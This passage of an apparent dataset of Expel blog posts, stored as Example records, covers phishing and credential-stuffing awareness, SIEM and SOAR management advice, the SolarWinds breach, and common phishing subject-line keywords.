business document like an invoice or contract). Sometimes PDF, ZIP, and other files attached to phishing emails are password protected to circumvent companies security tech. The attacker then includes the password in the body of the email, allowing their victims to open the document and interact with whatevers inside (this is also a common method for attackers to insert malware onto targets computers). Within the PDF, attackers will instruct recipients to access a link in the document. The link often redirects multiple times before ultimately landing on the attackers credential harvesting page, again usually imitating a legitimate login page to trick potential victims into entering their credentials. Once a Grinch has stolen a recipients credentials and gained access to their inbox, they typically look for emails about invoices or other financial information to insert themselves into the conversation and attempt to divert payments to a different account theyve set up. In one example, we saw an attacker successfully divert payment for a persons African safari vacation into the attackers account. These phishing emails target our inclination to respond promptly to communications from co-workers, vendors, or clients if we think action is required, like returning an invoice. Subject line keywords that promote action or a sense of urgency are favorites for attackers because they prompt people to click without taking as much time to think. A Whos to-dos: If you receive an email link to access a file, or an attached file that you arent anticipating, dont click any links or open any files right away. First double-check the sender  is this someone you know? Is their email address legitimate? If not, it could be a phishing email. If you find yourself on the login page for a file-sharing service, check if theres anything off. Are there any typos? Images that wont load? Oddly-written text or descriptions? Look at the URL  does it seem right? If you regularly use this service for work or personal file sharing, does this login page match what you usually see? If the answer to any of these questions is no, dont put your information in  it could be a credential harvesting site posing as a login page. If a suspected malicious email is sent to your work account, report it to your company security/IT team so they can check if other employees at your company were targeted by the same phishing campaign and if any accounts were compromised. While you order your Roast Beast delivery Aka: The most important thing to do while online shopping this season Weve covered some of the top scams you should keep an eye out for in your inbox this holiday season. But what about while youre hunkered down in front of your internet browser with a double espresso, noise-cancelling headphones, and your credit cards at 12 am this Black Friday and Cyber Monday? Our most important tip  dont reuse passwords! This will help protect you from credential stuffing attacks. Credential stuffing is a type of cyberattack where cyber Grinches take one set of stolen login credentials (for example, if your username and password to a site were leaked in a data breach and can now be found on the illicit web), then use automation to try them across a variety of sites or applications. Its possible attackers will try to compromise online retailers systems this holiday season to access credentials for their users accounts, either by taking advantage of vulnerabilities in a retail sites security or, more commonly, through credential harvesting like we discussed above. If successful, its easy for the attackers to then use the same credentials they obtained at other retailers or institutions, like financial providers. This can allow them to place fraudulent orders, steal credit card information stored on retailers sites, or access their victims financial and email accounts (where wire fraud and other financial crimes are their targets). As you register for accounts while online shopping this season, use unique, strong passwords (or better yet, passphrases!) for each site. This helps mitigate the impact if one of your accounts is compromised by keeping your other accounts secure. A Whos to-dos: Use different passwords for each of your accounts, particularly accounts that provide access to sensitive or personal information (like financial accounts, credit card information, or your address). Using a centralized password manager allows you to store unique, complex passwords for all of your accounts in a secure but easily accessible way. Use multi-factor authentication (MFA) on all of your accounts. MFA requires a second verification step beyond your login info (for example, providing a code sent to your phone number on file) to access your account. So even if an attacker gets your credentials, MFA will help prevent unauthorized access to your account until you can reset the password. Most sites and apps have an option to enable MFA for logins to your account, often with customizable preferences. Wrapping it all up Cyber Grinches are out there, hoping and wishing To steal all your cheer with some holiday phishing. So have your guard up and pay close attention To emails and websites for scam prevention! Keep your inbox secure and logins protected, And dont click on anything thats unexpected. Our top tips are below for your peace of mind To avoid cyber trouble this holiday time! Remember: Check senders email addresses if an email is remotely suspicious or unexpected. Dont click links or open attachments from senders you dont recognize or arent expecting. If you click a link in an email, check the URL it brings you to  does that URL look legitimate for that company? If not, dont put in any personal information. Look for abnormalities in emails or login pages that might indicate theyre fake (for example: typos, missing or unloaded images, oddly-written language or anything else that differs from your typical experience with that site/provider). Dont provide personal information to anyone claiming to be customer service over the phone unless you personally called that companys verified customer service number. Double check unusual requests from your boss through another communication channel  not just by hitting reply. Report anything suspicious in your work accounts to your companys security/IT team so they can investigate and look for other instances at your org. Use unique passwords for each account you create. And a last parting thought if your org needs support For monitoring and response when theres phishing to thwart  Reach out to our team about our contribution, Expel Managed Phishing could be your solution! Have a safe and happy holiday season from all of us at Expel!'}) (input_keys={'title'}),
  Example({'title': 'The myth of co-managed SIEMs', 'url': 'https://expel.com/blog/the-myth-of-co-managed-siems/', 'date': 'Aug 25, 2020', 'contents': 'Subscribe  EXPEL BLOG The myth of co-managed SIEMs Security operations  5 MIN READ  BRUCE POTTER  AUG 25, 2020  TAGS: CISO / Managed detection and response / Managed security / Management / SIEM Maybe youve already got a SIEM and youre looking for help managing it. Maybe youre thinking of buying a SIEM and concerned it might be too much to handle on your own. Or maybe youre using an MSSP and thinking of gaining more control of your data by working collaboratively in your SIEM rather than letting them do all the work. However youve arrived at the concept of co-managed SIEM, theres a number of potential pros and cons to think about when making your decision. Its important to really understand what youre going to get out of a co-managed SIEM  its a big resource and dollar commitment, and mistakes made early on can take a long time to correct. Our team encounters a lot of co-managed SIEM myths. In this blog post, Ill share the most common myths weve heard and our perspectives on the reality of co-managed SIEMs through the lens of how we do things here at Expel. 5 perceived benefits of co-managed SIEM Myth: Its the only way to get transparency. One of the biggest benefits people want from co-managed SIEM is visibility into their security operations. By working with a partner in your SIEM, you maintain some control over the detection rules that are in place, the sources of data and what your analysts are doing (regardless of whether theyre YOUR analysts or your partners analysts). Reality: There are other (better) ways to get transparency. We strongly believe that you cant build trust without transparency. Its key to being a good partner to our customers. Its also vital for efficiency and accuracy. So weve put a lot of thought into what transparency should look like in practice. At Expel, we provide our customers with complete visibility into our analysis and investigations  in fact, we invite all our customers to watch what were doing in Expel Workbench or talk with us in a dedicated Slack channel as an incident unfolds. We literally work alongside your analysts to prosecute events and respond to incidents. Example conversation in Expels customer Slack channel Further, you can review all activity to check our work  make sure you agree with what weve done and help improve detection and response capability. We want all third-party security providers to be held to the same account, since this is what wed expect from any MSSP we deal with (were a customer of ourselves, so it works out great for us). Myth: Greater control over business logic produces more detection value. Your SIEM is the codification of business logic you use to detect specific threats inside your organization. Custom rules and configurations allow you to look for attacks tailored to your systems and architectures. A co-managed SIEM allows you to continue to maintain this business logic. Reality: The vast majority of what you detect is the same as your peers and many other companies. Orgs think they want more control to write rules and generate alerts, but they dont realize how much it costs to manage detection content. Unless you invest a lot in this area, youll end up with a pile of false positives. In reality, your rules probably arent as unique as you think. Your provider has an advantage since they see the big picture (AKA lots of customers) and have the expertise to manage the detection content. However  You should expect your security provider to tailor their detection strategy for you to your business. This could mean fine tuning rules that already exist, taking advantage of rules youve written in your SIEM or working together to build new rules in our platform. Have a suggestion? No problem. Just let us know and well work to understand the use case and ensure youre covered. No matter what security provider you work with, once you share your suggestion they should do the rest. Myth: Youll get assistance from outside experts. By going to a co-managed SIEM, youre hoping to take advantage of the collective knowledge from your service providers. Presumably your provider has seen lots of good and bad and can advise you and your team on doing SIEM better. Youd also think that they will answer general security questions and concerns you may have. Reality: You should expect this assistance from your third-party security partners. Once again, your third-party security partner shouldnt just process alerts. MSSPs have lots of institutional knowledge they can share to help improve your broader security program. We work to push as much information to our customers (and publicly) as we can to help everyone make their organizations more secure. Further, our engagement managers are a window into Expel that can get you answers to tough security questions. Myth: My SIEM will have all of the data required for detection and response. Many organizations envision their SIEM as the single place where all data exists for detection and investigation.Thinking about co-managed SIEM as a strategy doubles down on this assumption as youre paying for a provider to help manage that signal and detection content. The hope is that your SIEM will provide visibility across the entire environment and enable your team to respond to all kinds of threats. Reality: Storing data in a SIEM is a lot of work.. Getting all the data that you want into a SIEM can be an exhausting process. And making sure it continues to go into a SIEM isnt much easier. Weve built API integrations with over 45 different vendors. We learned pretty quickly that data sent to a SIEM is not nearly as rich as data that can be pulled from API  which can inhibit detection and response with a SIEM. As organizations increasingly use cloud applications and infrastructure, the vision of the SIEM as a single source of truth starts to make less sense. So its important to evaluate why you need (or think you need) a SIEM. There will be instances when sending your data to a SIEM is a wise choice (well explore this a bit more in a future blog post). But, for example, you dont need to store those Office 365 or AWS logs in your SIEM when your cloud provider is already storing them for you and your MSSP can consume them directly. Thats why we connect directly to cloud providers  meaning that regardless of the choice you make, youll always get the visibility you need. And the reality thats all too familiar  This is a big one. Its too many cooks in the kitchen. One of the problems with a co-managed SIEM is orchestrating who is doing what. A SIEM is a big piece of technology and dividing up responsibilities can be confusing. Who handles upgrades? Whos responsible for rule QA? Who handles device integration? How about analyst shifts? If the answer is it depends  expect friction! By having a third-party security partner rather than a co-managed SIEM, the roles are clearer for both your staff and the service provider. Avoiding confusion at this stage helps ensure youre focused on the right issues (like generating good signal, minimizing noise and detecting bad actions) and not wasting time on RACI charts and scheduling. The chart below gives you a general idea of how we might assign roles at Expel: Roles and responsibilities with third-party security partner Responsibility Co-Managed SIEM Expel System Upgrades Provider You Log Source Onboarding Both You Health Monitoring Both Expel Rule Management Both Expel Alert Triage &amp; Investigation Both Expel Reporting Both Expel Remediation You You The value in SIEMs We think SIEMs are a valuable part of an organizations security architecture. When properly fed, they are the source of truth for an investigation. The information and analytical capability in your SIEM can be invaluable for analysts and investigators when working through the trail of alerts and data involved with suspicious activity. Further, SIEMs are great data normalizers.Taking in unstructured data, providing structure and storing in an orderly way can open up many more opportunities for signal generation in your company. Data that might otherwise go ignored can be put to great use in your SIEM. Finally, theyre great tools for your analysts. From experimentation to ongoing operations, a good SIEM and staff that know how to use them can fulfill their promise  serving as a focal point for your security operations. However, even the best SIEM needs people. If you dont have in-house expertise and are thinking about co-managed SIEM as an option, consider these common myths and what you could accomplish by asking more of your third-party security partner. A service (like Expel) that can transparently use your SIEM can be a real game changer in your security program. Let us know if you want to chat .'}) (input_keys={'title'}),
  Example({'title': "The security people's guide to Expel's exe blog", 'url': 'https://expel.com/blog/security-peoples-guide-expels-exe-blog/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG The security peoples guide to Expels exe blog Expel insider  2 MIN READ  DAVE MERKEL  AUG 24, 2017  TAGS: Announcement / Company news Remember that time we started an information security company? Yeah, yeah I do. Twice. Who would do that, you ask? Who would first commit one of the classic blunders (quick recap for those that dont know the list, they are: 1) land wars in Asia, 2) mixing death and Sicilians, and slightly less well known 3) building endpoint security products) AND THEN jump back into the cybers for another go-round? Me, I guess. Im that guy. Im the guy that also commits the rarely cited, but oh so true, fourth classic blunder: volunteer to write the first post of a new blog. By volunteer I, of course, mean failed to outrun marketing. Hi everyone, Im merk (this is where you say hi merk). My given name is David, and Ive occasionally been called Dave, but if you want to get my attention in a crowded room to, say, get you another beer, I recommend sticking with merk. No caps please, it cramps my style. My colleagues and I at Expel are new here. Youll be hearing quite a bit more about us in the future. So let me take just a couple minutes to introduce who we are and why you might care. Note I said who we are, not what we do. Were not quite ready to talk about that yet, but stay tuned. I should probably start using buzzwords here, like luminary or perhaps ninja . World renowned and market-leading should also show up. However, who we are could best be summed up as not those people . We do what we do because we love information security, love helping our customers, love working with each other, or some combination of all three. Were not big fans of how information security companies talk about themselves, but we are big fans of cool infosec things, whether theyre new technologies, attack methods, intelligence analysis, or even just lessons learned from a hard day at the office and holy crap do I have a ton of those. My best stories usually start out like this: Let me tell you about the time I screwed this thing up One thing I didnt screw up: the team we have here at Expel: sharp developers, analysts, seasoned security veterans and business professionals. Theyre all way smarter than I am, and it turns out they have some pretty interesting things to say. So were creating this blog as a forum for you to hear a bit more from them. They dont want to spend time talking about Expel, per se. They want to spend time talking about information security , about those aha! and oh yeah! moments we have while we pursue our passion for protecting our customers. And occasionally, those oh shh. moments when we screw something up. Hopefully, you can take an executable tidbit out of everything we say  a tip, trick, technique  something to make your information security world easier, better, or more fun. Come along with us. Bookmark our exe blog , tell your friends and engage us on the socials (twitterinstagramchat or whatever you crazy kids are using these days, marketing link here because they made me: follow us on LinkedIn and Twitter ). And please, please let me know if any of us use the phrase global market-leading cybersecurity company . Anyone caught doing that buys the next round. Oh yeah, and were hiring !'}) (input_keys={'title'}),
  Example({'title': 'The SOC organic', 'url': 'https://expel.com/blog/the-soc-organic/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG The SOC organic Security operations  4 MIN READ  DAVE JOHNSON  MAR 14, 2023  TAGS: MDR These days, you cant swing a quantum cat without hitting a conversation about how recent artificial intelligence (AI) breakthroughs are changing our lives. Having grown up during the dawn of personal computing, the internet (*insert dialup modem sounds*), and cybersecurity, embracing new technology to find out what cool new things I can do is totally my jam. Im right there along with you in the assess, adapt, and adopt queue with AI. Innovations like ChatGPT are incredible. However, theyre primarily designed to solve a problem we didnt have in The Olden Times. Before the information superhighway, before copying and floppying, before we surfed the world wide web, we hadstay with me herelibraries. And so far, AI hasnt managed to replicate whats best about libraries. You may be asking yourself, What does this have to do with cybersecurity? Read on to find out. I absolutely adore libraries. The more books the better. Old books, new books, books written in other languages, reference, literature, fiction, everything, all of it. But books, admittedly, have some significant limitations. Theyre not immediately searchable and its not easy to consume the data at speed, for example. The information in a book that you want must be ingested, deciphered, and contextualized. Some books and some readers do that far better than others, but the results are inconsistent. In the past, reading fast and being able to comprehend everything as much as possible in a systematic way was the primary strategy for getting the information you needed (aka research). Digital publishing and search engines fixed all that. They initially solved the problem quite well and we were all participants in this great experiment of connecting the world to information and placing it at our fingertips. At any given time I can search and receive the exact answer to a query like, What is the airspeed velocity of an unladen swallow? just by typing or speaking the question into the appropriate search engine. (Its 31-40 mph, BTW.) Then things changed. Search engines improved their capabilities and the dataset grew, but now we have a different challenge standing between us and the information we seeknamely, search engine marketing. One problem is that organic results, which are usually what youre looking for, can be buried beneath advertising (many times the top organic result doesnt even appear on the first screen). Also, as most of us know from frustrating experience, it can still be hard to find what you wantwe can try every combination of search terms we can think of and still come up dry. Thats where the new AI chatbots come into play (Microsoft recently launched its new ChatGPT-fueled Bing and Googles Bard is on the way). Given the right prompt, they can help us cut through the noise to the information we really want. We all ultimately want clear answers, and AI does this pretty well. (Although the ads wont go away, there should now be a cleaner signal:noise ratio.) There are some things missing, though. Context for one. For example, AI knows your purchasing history and consumer profile, but it doesnt necessarily know you or your hopes and dreams, as it were. It doesnt have any lived experiences that mirror your own. These context-free large language models have never been a person before (as recent chat transcripts make clear). They wont necessarily make connections to secondary factors relevant to your inquiry and they probably wont have a useful knack for the tactical application of serendipity. Libraries have always had a solution to that problem, though. Enter stage left, the amazing and borderline-omniscient Research Librarian! Ask any question of this highly trained, friendly neighborhood expert in just about everything, and youll shortly receive straight, relevant answers, additional recommendations, along with additional context. Their training and experience allows them to deliver these results in the way you find most useful. I now submit to you, Dear Reader, my thesis: human civilization, in the development of AI, has been trying to reinvent something we pretty much always had, and still have today. Clear answers, delivered in a way that makes sense, with other valuable information attached and applied in a personalized contextI think along the way we simply became so distracted by shiny new objects that we forgot the important part. Information, like any tool, is only as good as your ability to use it, and how its delivered matters. And now, we come to answering the question posed above. Our team here at Expel keeps that end goal in mind. Our customers tell us they need max signalspecific information, relevant context, references, and suggestions for further reading, and they need the noise eliminated. To deliver on that, we believe managed detection and response (MDR) should be as organic as possible and it should seamlessly integrate the best available automation technologies with the experience and insight of analysts whove been there, done that, and understand what customers need. Tools should be designed and implemented with the ability to scale in mind and customers desired results should always be the foundation for everything a provider does. This is the issue: what makes libraries awesome, and what AI is missing, is people. And were big fans of people. As customers shop around the security space, they always hear how theres a better way. But too many have never been asked, only told. If security vendors pose questions and listen in good faith, prospects will tell them what that better way looks like. So as we consider the role that AI plays in cybersecurity, remember that its a tool. Its pretty darn interesting, and brings with it major potential. But unless something significant changes, it wont deliver the outcomes that organizations need to keep their systems safe without a human touch and perspective. One more thing. If its been a while since youve visited your local public library, now is a great time to go. The membership cards are a lot cooler now, theres terabytes and tebibytes of digital comic books you can download and read, and some branches even have 3D printers and CnC machines you can use. While youre there, chat with the research librarians and ask them about the services they provide. Maybe tell them, Expel sent me. Theyll initially have zero idea what youre on about, of course, but if you send them this post it just might provide them additionaland relevantcontext. Great eXpeltations 2023'}) (input_keys={'title'}),
  Example({'title': 'The SolarWinds Orion breach: 6 ideas on what to do next ...', 'url': 'https://expel.com/blog/solarwinds-orion-breach-what-to-do-next/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG The SolarWinds Orion breach: 6 ideas on what to do next and why Security operations  3 MIN READ  JON HENCINSKI, ANTHONY RANDAZZO, BRUCE POTTER AND MARY SINGH  DEC 16, 2020  TAGS: Cloud security / MDR / Tech tools Well, 2020 is really going out with some fanfare, isnt it? The revelation of SolarWinds Orion monitoring product being compromised by nation state intelligence is keeping a bunch of people very busy heading into the holidays. Bah humbug to that. With a few days hindsight, we wanted to take a breath and offer some observations on how things are going, what we can expect going forward and how organizations everywhere should be thinking about detecting post-compromise malicious activity. Before we dive into the heres what were seeing and how you should plan for the long haul, lets take a minute to applaud the leadership shown by FireEye, Microsoft and CISA. These orgs continue to be transparent on the technical and mission aspects of this attack. That transparency helped the entire cybersecurity industry understand the technical nature of the attack and begin to wrap our arms around the broader business impact to our customers. In turn, that helps our customers and any impacted businesses, in general, better understand their own risk as they navigate their way through this mess. Now lets dig into some observations and recommendations: Youll need to rewind the clock as you search for evidence of compromise as a result of the SolarWinds Orion breach. Weve seen instances of the backdoored SolarWinds Orion signed DLL, known as SUNBURST in many organizations, as have our peers. SolarWinds indicated up to 18,000 organizations may be vulnerable to this exploit, so its hard to overstate the potential impact this backdoor could have on a broad set of industries. One of the challenges were facing in scoping these incidents is the need to rewind the clock sufficiently to see when the earliest potential malicious actions could have taken place. In this case, SolarWinds indicated their software was implanted nine months ago, so ideally wed like to look through nine months of evidence to see signs of attack activity. Data retention policies might make this difficult. Unfortunately, retention policies can get in the way of this kind of look back and we may only get a few weeks or months worth of data to review. Data retention is a hard scale to balance; limiting cost and improving performance while maximizing historical accuracy means some organizations have the data they need in the wake of this breach but others do not. But vendors are (thankfully) jumping in and creating detections thatll help security teams everywhere identify and mitigate related attacks in the future  so ask your vendors what detections theyre working on. Thanks to the turbo-charged @andrew__morris observation that the backdoored software was still on SolarWinds website on Monday, December 14th, we continued to see new instances of the malicious DLL created on disk as customers attempted to upgrade their installation. Why is this good news? Because at least by that time most security vendors had detections in place so we saw it land and were able to immediately remediate. A big shout out to the vendor community at large for getting those detections created and pushed out in a timely manner. It makes a huge difference to operators when the cycle between news breaking and having functional detections in place is as short as possible. Theres more good news: We havent seen any evidence of recent SUNBURST command and control. This is a great sign for our customers. We do however have limited telemetry for our customers and this breach dates back to March 2020. This kind of event underscores the importance of having a fully functional EDR solution. In particular, you need one that supports robust remote forensic examination of a system. Being able to investigate endpoints at scale in an automated fashion to assess impact and risk to an organization as quickly as possible is incredibly important in an event like this. The bummer with these tools is that they really shine when the situation is the darkest. On a normal day when everything is normal you dont think, Gosh! I wish I had a better EDR tool. But when things go totally sideways like they did this week, the quality of your EDR can change (or destroy) the game. With that said, sometimes a historical compromise like this can only be addressed with a good ol fashioned incident response engagement. Be on the lookout for the long tail of compromise. The tail of these kinds of attacks can be quite long, and adversaries who entrenched themselves inside your org can be difficult to fully root out. Moving forward, were focused on finding post-compromise activity observed during this global threat campaign. In particular, were building detections and hunts for events such as Azure AD PowerShell behavior, modification of domain federation trust settings, and researching ways to discover forged SAML tokens, anomalous logins, Azure lateral movement, and privilege escalation activity. While many of these are events were looking for anyway, were turning the dials on orgs that may be compromised via SUNBURST to surface more of these events and correlate them in new ways based on the TTPs that were published as part of this attack. Thats it for now. Thank goodness  IT and security folks everywhere dont need any more to deal with. In the coming weeks, well have even more visibility on both the technical and business shifts that are happening in both the cybersecurity industry and the economy at large. Well keep you posted as we learn more. As always, wed love to hear from you if you have thoughts to share.'}) (input_keys={'title'}),
  Example({'title': 'The top cybersecurity attack trend we saw emerge during ...', 'url': 'https://expel.com/blog/top-cybersecurity-attack-trend-covid-phishing/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG The top cybersecurity attack trend we saw emerge during the COVID-19 pandemic Security operations  ANTHONY RANDAZZO  MAY 6, 2021  TAGS: Cloud security / MDR Finally  2020 is behind us. Unfortunately, Expels SOC observed that attackers used the pandemic as an opportunity to evolve some nasty tactics. We pulled some data on the incidents we responded to over the past year and noticed a clear trend: phishing and BEC remain a top threat. Check out our infographic to get the full download on what our data reveals about the top attack trend in 2020 (and now).'}) (input_keys={'title'}),
  Example({'title': 'The top five pitfalls to avoid when implementing SOAR', 'url': 'https://expel.com/blog/top-five-pitfalls-avoid-implementing-soar/', 'date': 'Jul 10, 2019', 'contents': 'Subscribe  EXPEL BLOG The top five pitfalls to avoid when implementing SOAR Security operations  8 MIN READ  YANEK KORFF  JUL 10, 2019  TAGS: CISO / Managed security / Management / Planning I was recently in a room full of CISOs and the topic-du-jour was SOAR . The headline on the PowerPoint slide read SOAR or SORE?  a joke to get the conversation started. Given limited budgets and the general shortage of experienced security talent, most of the CISOs in the room were already looking to automation to help bridge the gap between their operational reality and the unrealistic expectations of the rest of the business. But was automation really closing that gap? No was the popular response, which came amid a smattering of not yets and its starting to. It seemed that at least some orgs were beginning to implement systems that were automating workflows and streamlining security operations. But is merely beginning to automate things here and there enough to say that youre doing SOAR? What is SOAR? As it turns out, it all depends on how you interpret the definition of SOAR. Some say its not SOAR unless it can operate independently without human intervention . Others claim SOAR is a ticketing system, or case management system, but not the IT ticketing system, but maybe not a ticketing system at all . All of these definitions and interpretations can make your head spin. Whether or not you believe robots can replace humans entirely (we dont, by the way), I dont think these disagreements about definitions matter much. For our purposes, lets define SOAR broadly. Its some set of technologies that helps you integrate the security tech you already have (and will add over time) and weave it together so it saves you time and helps your humans scale better. Yes, I understand that Python.org or /bin/bash probably both qualify as SOAR according to this definition. Lets assume for a moment Im not stressed out about that. A little history explains why. But what really is SOAR? Longer ago than Id like to think about, I worked on the security team at America Online. At the time, we had to build much of our technology in house because what was available commercially (or even as open source) wouldnt work at our scale out of the box. Its the same sort of problem folks like Netflix and Google faced years later. So we ended up building middleware (pretty sure this is what SOAR was called back then) to streamline a variety of security workflows to support identity and access management, authorization management and incident response. One of the initial challenges we had when trying to automate from point A to point Z was that the business rules kept changing under our feet. That made it hard to code the steps in between. So we built a generic system to automate the parts that were largely static, left a few key steps in the middle for humans and then technology picked the workflows back up again and finished the process. Heres a quick IAM example: 1) let software collect information from managers about who needed access to what; 2) let the software provision access directly where APIs were available and 3) create tickets for humans where APIs were absent. Then, when all access was provisioned, handle the notifications and track the access over time to ensure it was disabled if not used in 90 days or if not renewed by managers after 365. Overall this system worked well, but maintenance costs were heavy because systems across the company kept changing  which meant the APIs and underlying data models changed constantly too. It should be called SORE Walk into any development shop and the engineers are probably familiar with the phrase its like changing a jet engine mid-flight. Its the age-old problem of introducing (or replacing) technology without damaging the business. And its HARD. Making significant changes to a technology platform thats used heavily (or used at all) is a painstaking endeavor  and when the technology in question was built over time  organically  rather than as part of a well thought out architecture that could withstand future changes, well  most engineering teams find themselves drowning in tech debt . So let me propose this: SOAR is not orchestration and response. Those arent the activities youre doing when you implement SOAR. SOAR is SORE. Jokes and conversations starters aside, it really should be  Security Operations and Response Engineering . This is an engineering problem and should be treated as such. What do I mean by as such? Im glad you asked. Five pitfalls when implementing SOAR Because Ive learned the hard way what not to do, Im now sharing with you the five mistakes I wish I hadnt made. Pitfall 1: Automating everything The Great Chicago Fire of 1871 (hang with me here, I promise its relevant) took out over three square miles of the city, hopped the river and displaced 100,000 people before it was done. At the time, Chicagos firefighters relied on horse-drawn carriages for fire engines. Imagine solving this problem with automation. You could put Ferrari engines in fire trucks and the firefighters would have arrived faster. But it wouldnt have solved the problem. The firefighters were exhausted from putting out both small and large fires over the past week. Instead of jumping to automation as the solution, maybe its worth taking a look at why there are so many fires in the first place. When your citys made primarily of wood and lumber yards are located on the banks of the river  which let fires quickly move from one side of town to another  youve got some pretty compelling reasons to make architectural changes before turning to automation. SOAR is no different. Take the time to understand whats driving the volume of your work and see if there are architectural changes or tuning you can do upstream in your security infrastructure before you automate. Pitfall 2: Listening to your analysts Just kidding  you should totally listen to your analysts. But evaluate what they say in the context of data. As a general rule, if you ask an analyst what to automate, theyll describe an annoying time-consuming process they had to go through last Tuesday. What they wont tell you is that its the only time theyve had to do that this month. Its a recent enough memory though and painful enough that they dont want to have to do it again  so thats whats top of mind. Beyond anecdotal recaps of something an analyst thought was tedious, you need metrics. As you figure out what to automate, metrics will help you make that decision and prioritize your engineering investments. Fixing an annoying workflow during an investigation might save one person a half hour once a month, but cutting one minute from a triage step (that nobody realizes theyre doing because its muscle memory at this point) could save everyone on your team a half hour a month. Good instrumentation and metrics management will help you figure out what to automate next (pro tip: check out tools like Datadog and Tableau to organize, visualize and analyze your data). Pitfall 3: Building brittle integrations I like to think about SOAR platforms as being measured best by TTP: time-to-Python. How much will your SOAR platform do for you before you have to write Python? Its usually measured in minutes. Beyond lambasting the limitations of SOAR, though, lets take a look at the software you write to achieve the orchestration you want. If your security team is like most, youre likely to swap out at least one technology in each tech category every four years or so. Maybe your SIEM (Security Information and Event Management) tech sticks around longer ( even though you wish it wouldnt ). To avoid the pain of rebuilding everything each time to swap out a security product, youve gotta make one crucial investment  adding an abstraction layer between analysis and security product. With an effective abstraction layer, you normalize data and queries across similar technologies. For example, one endpoint tech becomes no different from another upstream in the technology stack. Your analysts and your analytics can say get me this file, and your SOAR architecture will figure out how to do that with Tanium today  and it wont skip a beat if you try to do it with Carbon Black tomorrow. Anything short of this and youve built a brittle integration that youll need to rebuild later. While youre at it, watch out for other areas that might be brittle. If youre automating a process you dont understand well its liable to break readily. On the topic of things breakingexpect your processes, your technology, and even your people to fail from time to time. The automation you build needs to stand up to those failure conditions without creating more work. Pitfall 4: Assuming youre getting better The old management adage goes like this: What gets measured gets done. If you really want to improve your orchestration and automation, its vital you know where you are today to figure out (and celebrate) as you improve. Some of this youll do through operational metrics that youve put in place as part of a security operations and response program. Fixating on this, though, could cause you to lose sight of the big picture. Imagine for a moment youve built a security operations program that operates effectively but is optimized to find and stop nation-state attackers. Thats great if youve got other countries all up in your business every other week, but less effective when garbage spear phishing results in business email compromise every day. You need both capabilities and by fixating on just a subset of your metrics, you might be celebrating myopia. Security operations, whether SOAR-enabled or not, operates in the context of the broader risk management environment. If youre making conscious decisions across this broader scope, youre less likely to over-invest in one capability at the detriment of another that you need even more. There are lots of ways to get this done, but were fans of the NIST Cybersecurity Framework. Its comprehensive, helps guide your thinking, and its not hard to get started . As you continue developing your security program, take another measurement. Mixing internal assessments with less frequent external ones like NIST will ensure youre seeing the forest through the trees and help you mitigate your own bias. Pitfall 5: Getting comfortable Its rare to find a CISO whos complacent. Most are perpetually on edge, somewhat (who are we kidding?) paranoid and wondering if today is the day everything goes down in flames . Still, when you spend so much of your time making sure the plates keep spinning , its tough to take the time to inject yet more chaos into the system to see how the team handles it. Staying with the big picture theme, tabletop exercises are great ways to think through how youd respond in the face of a real problem. When you think about getting comfortable in the context of SOAR  realize that the automation youve built ages. The processes youve solidified into automation may have worked well when they were built but as the business has changed around your implementation, do the same assumptions hold true? Or is it time to re-think the process and therefore the automation. One of the most effective ways to figure this out is through scenarios. We run tabletop exercises every quarter at Expel and it never ceases to amaze me the breadth of interesting discoveries we make, far afield from security technologies, let alone SOAR. It really puts things in perspective. Still, who really wants to sit in a room and plod through boring and stressful scenarios? Fortunately, weve got something that might help. If you enjoy games (especially D&amp;D) and are willing to shake things up a little with your executive team, check out Oh Noes! It a security-focused tabletop exercise, D&amp;D style. Bring some Doritos and youve got a social event and risk-management exercise in one. Where do you go from here? Avoiding pitfalls seems like a tough thing to do today. Okay, Ill watch out for those problems, you might think. But were all on a journey as we look to improve what were doing from a day-to-day security perspective. Whether youre in the middle of SOAR implementation or its still on the far distant horizon at your org, there are things you can do today to help you prepare or adapt. Take a measurement . Figure out where you are from a security program perspective. Inject some (healthy) chaos . Try Oh Noes! and entertain your team. Contemplate your metrics . Evaluate if youve got the right ones in place. If youre still wondering if SOAR is right for your org or how you might go about implementing it, let us know  wed love to talk .'}) (input_keys={'title'}),
  Example({'title': 'The top phishing keywords in the last 10k+ malicious ...', 'url': 'https://expel.com/blog/top-phishing-keywords/', 'date': 'Sep 8, 2021', 'contents': 'Subscribe  EXPEL BLOG The top phishing keywords in the last 10k+ malicious emails we investigated Security operations  5 MIN READ  RAY PUGH AND SIMON WONG  SEP 8, 2021  TAGS: MDR / Phishing Did you get a chance to read our report on the top attack vectors used by bad actors in July ? If not, here are two important takeaways: Phishing was the top threat in July, making up 72 percent of the incidents our Security Operations Center (SOC) investigated. Breaking this down further, nearly 65 percent of the incidents our SOC investigated in July were Business Email Compromise (BEC) attempts in Microsoft Office365 (O365). TL;DR: Phishing is on the rise and we expect it to stay that way. So preventing BEC and credential harvesting through phishing should be a priority for resilience efforts. We decided to take a look at how bad actors are enticing their victims to open and engage with phishing campaigns. We analyzed the last 10 thousand malicious emails that our team investigated to determine the top keywords bad actors are using in their email subject lines. As youll see below, these keywords aim to make recipients interact with the content of the email by targeting one or more of these themes: Imitating legitimate business activities Creating a sense of urgency Prompting the recipient to act In this post, well share the top keywords used in email subject lines, examples of subject lines from the malicious emails we investigated and some context around why bad actors might choose to use each keyword. Knowing how bad actors are targeting their victims can help inform your phishing strategy and education program. Top Phishing Keywords Invoice Real subject lines: RE: INVOICE Missing Inv ####; From [Legitimate Business Name] INV#### Context : Generic business terminology doesnt immediately stand out as suspicious and maximizes relevance to the most potential recipients by blending in with legitimate emails, which presents challenges for security technology. Most people are also inclined to respond promptly to communications from co-workers, vendors or clients if they believe action is required, like returning an invoice. New Real subject lines: New Message from #### New Scanned Fax Doc-Delivery for #### New FaxTransmission from #### Context : New is commonly used in legitimate communications and notifications, and aims to raise the recipients interest. People are drawn to new things in their inbox, wanting to make sure they dont miss something important. Message Real subject lines: Message From #### You have a New Message Telephone Message for #### Context : Most people using a work account want to make sure theyre promptly responding to communications from co-workers, vendors or clients  and are inclined to read or listen to new messages quickly. Required Real subject lines: Verification Required! Action Required: Expiration Notice on [business email address] [Action Required] Password Expire Attention Required. Support ID: #### Context : Keywords that promote action or a sense of urgency are favorites among attackers because they prompt people to click without taking as much time to think. Required also targets employees sense of responsibility to urge them to quickly take action. &lt;Blank Subject&gt; Context : Blank subject lines generally evade automated security measures  security tech cant scan for phishing or spam keywords if there arent any. File Real subject lines: You have a 